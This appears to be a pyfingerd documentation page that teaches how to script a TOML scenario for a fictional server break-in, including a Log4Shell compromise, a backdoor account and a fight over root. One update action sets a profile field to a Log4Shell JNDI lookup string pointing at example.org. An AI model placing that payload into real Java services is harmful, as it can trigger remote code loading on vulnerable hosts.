.. _writing-scenarios:

Writing a scenario for pyfingerd
================================

So you want to narrate a story using pyfingerd! But how does one do that?
This guide will take you step by step into making a simple story, so as
to allow you to build your own.

The story we want to tell is the following:

* The system has been installed 100 days ago. No one has ever used a
  login shell on user ``root``.
* Thomas is an employee of ``EXAMPLE.ORG`` since 90 days ago.
  He works there from 8 AM to 6 PM, and logged in during all of this
  time (*this mostly comes from the time universities and workplaces had
  one mainframe for everybody; but hey, we can cheat a little, this is
  not the most straightforward medium!*).
  He is idle during lunch time, between 12 PM and 1 PM.
  He works on an important project for the company.
* pir4te is a script kiddie who has just discovered the log4shell_
  vulnerability, and uses it to gain access to Thomas' account
  at around 3 PM, and defaces his account.
* root is compromised at around 3:05 PM by pir4te. A new user is created
  for him as a backdoor, inadvertently visible through finger until
  he thinks of ``touch``-ing ``.nofinger`` at 3:15 PM.
* rescueadmin is created at around 3:45 PM, and root has a second session
  since pir4te is still logged in. A fight for power starts, until
  the pir4te session dies at 3:55 PM.
* A new pir4te session is born, until thomas is deleted at 4:03 PM and
  rescueadmin is deleted at 4:06 PM.
* The server is finally stopped at 4:17 PM; we're unsure of if pir4te did
  this by making the server crash or thomas did this to protect its data.

Some of these things will be passed through the command line:

* The host, ``EXAMPLE.ORG``, will be passed using the ``-H`` option.
* The path of the scenario will be passed using the ``-s`` option.
* To make it simplier, the start of the scenario will be at midnight on
  the day the hacking happens.

Initializing the environment
----------------------------

We start by creating the TOML file in a dedicated directory, e.g.
``story/script.toml``. The script is empty, but we can elaborate our
command-line to run the tests while we do it. For example, let's say
we're on the 25th of December, 2021, our command line would be the
following:

::

    python -m pyfingerd -b 'localhost:3999' -t scenario -s story/script.toml \
        -S 2021-12-26 -H 'EXAMPLE.ORG'

A quick test reveals that everything works perfectly!
We can now start writing the scenario.

The set up
----------

What we want to do now is to set the state at the script start, i.e.
midnight, by describing the past using actions with past times.
The main set up actions will be the following:

::

    [[-100d10h33m39s]]
    type = 'create'
    login = 'root'
    shell = '/bin/bash'

    [[-89d13h54m2s]]
    type = 'create'
    login = 'thomas'
    name = 'Thomas Tapes'
    office = 'Central Office'
    shell = '/bin/bash'
    plan = 'exampleorg.txt'

Each section represents an action. The first section represents the creation
of user root, more or less at the same time as the installation of the
system, and the second section represents the creation of user thomas.
Note that the plan is a relative path (from the directory containing the
script) to the plan file, which contains a classic plan:

::

                                    _
      _____  ____ _ _ __ ___  _ __ | | ___   ___  _ __ __ _
     / _ \ \/ / _` | '_ ` _ \| '_ \| |/ _ \ / _ \| '__/ _` |
    |  __/>  < (_| | | | | | | |_) | |  __/| (_) | | | (_| |
     \___/_/\_\__,_|_| |_| |_| .__/|_|\___(_)___/|_|  \__, |
                             |_|                      |___/

                ~ excellence is not an option ~

Section names represent the timestamps. For example, ``-100d10h33m39s``
means "100 days, 10 hours, 33 minutes and 39 seconds before the start";
I chose to not make it exactly 100 days in the past in order to make
it more realistic, while keeping in mind that the server has probably
been installed during work hours.

Now that this setup is done, let's set up the last session in the past of
user thomas. What we want to add is the following logout action, for him
to having logged out at around 18.05 PM:

.. code-block:: toml

    [[-5h54m2s]]
    type = 'logout'
    login = 'thomas'

However, that means that we have a 'logout' event without a 'login' event!
When loading the script, pyfingerd tells us exactly that:

::

    $ python -m pyfingerd -t scenario -s story/script.toml \
        -S 2021-12-26T00:00:00 -b 'localhost:3999'
    ERROR Error loading the scenario:
    ERROR At action #3 at -5h54m2s: trying to delete non existing session of user 'thomas'.

What we need to do is to put a login event before this, e.g. at the
start time of the user's shift.

.. code-block:: toml

    [[-15h56m44s]]
    type = 'login'
    login = 'thomas'

Indeed, if we run the server before 8 AM and search for ``t@localhost``, we
get the following result:

::

    Site: EXAMPLE.ORG
    Command line: t

    Login name: root                        Name: root
    Directory:                              Shell: /bin/bash
    Never logged in.
    No plan.

    Login name: thomas                      Name: Thomas Tapes
    Directory:                              Shell: /bin/bash
    Office: Central Office
    Last login Sat Dec 25 08:03 (CET) on console
    Plan:
                                    _
      _____  ____ _ _ __ ___  _ __ | | ___   ___  _ __ __ _
     / _ \ \/ / _` | '_ ` _ \| '_ \| |/ _ \ / _ \| '__/ _` |
    |  __/>  < (_| | | | | | | |_) | |  __/| (_) | | | (_| |
     \___/_/\_\__,_|_| |_| |_| .__/|_|\___(_)___/|_|  \__, |
                             |_|                      |___/

                ~ excellence is not an option ~

Which is the result we were trying to achieve! Now we can go to the main
events of the day.

The main events
---------------

In order to accomplish the main events of the day while respecting the
habits described in this document, we need the following events:

 * thomas logs in at around 8 AM.
 * thomas goes idle at around 12 PM.
 * thomas stops being idle at around 1 PM.
 * thomas' profile is edited to reflect the hacking at 3 PM.
 * thomas' profile is edited again to reflect the defacing at 3:02 PM.
 * root logs in at around 3:05 PM.
 * pir4te's account is created at around 3:07 PM.
 * pir4te's account is visibly deleted at around 3:15 PM.
 * rescueadmin's account is created at around 3:45 PM.
 * root logs in at around 3:45 PM.
 * root's profile is edited to reflect the battle at around 3:47 PM.
 * root's first session is deleted at around 3:55 PM.
 * root logs in on a third session at around 4:00 PM.
 * root's second session is deleted at around 4:02 PM.
 * thomas' profile is deleted at around 4:03 PM.
 * rescueadmin's profile is deleted at around 4:06 PM.

Note that root will have several sessions in this scenario; each session
will be referred to by name so as to manipulate the right sessions for the
right events.

One application of these instructions are the following:

.. code-block:: toml

    [[8h6m4s]]
    type = 'login'
    login = 'thomas'
    line = 'ttyS1'

    [[11h50m57s]]
    type = 'idle'
    login = 'thomas'

    [[12h47m]]
    type = 'active'
    login = 'thomas'

    [[15h1m56s]]
    type = 'update'
    login = 'thomas'
    office = '${jndi:ldap://example.org/a}'

    [[15h2m42s]]
    type = 'update'
    login = 'thomas'
    plan = 'pir4teishere.txt'

    [[15h5m23s]]
    type = 'login'
    login = 'root'
    name = 'session1'
    line = 'pts/0'

    [[15h7m7s]]
    type = 'create'
    login = 'pir4te'

    [[15h16m21s]]
    type = 'delete'
    login = 'pir4te'

    [[15h44m8s]]
    type = 'create'
    login = 'rescueadmin'
    name = 'rescueadmin.org client'

    [[15h46m33s]]
    type = 'login'
    login = 'rescueadmin'
    line = 'ttyS1'

    [[15h46m59s]]
    type = 'login'
    login = 'root'
    name = 'session2'
    line = 'ttyS1'

    [[15h48m19s]]
    type = 'update'
    login = 'root'
    shell = '/sbin/nologin'

    [[15h49m39s]]
    type = 'update'
    login = 'root'
    shell = '/bin/bash'

    [[15h50m2s]]
    type = 'update'
    login = 'root'
    shell = '/sbin/nologin'

    [[15h52m3s]]
    type = 'update'
    login = 'root'
    shell = '/bin/bash'

    [[15h55m25s]]
    type = 'logout'
    login = 'root'
    name = 'session1'

    [[16h1m9s]]
    type = 'login'
    login = 'root'
    name = 'session3'
    line = 'pts/0'

    [[16h3m51s]]
    type = 'logout'
    login = 'root'
    name = 'session2'

    [[16h4m20s]]
    type = 'delete'
    login = 'thomas'

    [[16h6m5s]]
    type = 'delete'
    login = 'rescueadmin'

The ending
----------

At 4:17 PM, the server should be stopped. This ending is represented using
a simple 'stop' event:

.. code-block:: toml

    [[16h17m33s]]
    type = 'stop'

Note that any event after that won't be run, regardless of the ending type.

And that's it, the story will play during the day and the server will stop
at 4:17 PM; be careful not to have enabled auto-restart if you manage the
service through your init daemon (e.g. systemd), although if the
arguments don't change, all pyfingerd is going to do is shut itself down
immediately!

The result is available in ``examples/pir4te`` on the pyfingerd repository.
For more event types, you can consult :ref:`scenarios`.

.. _log4shell: https://en.wikipedia.org/wiki/Log4Shell
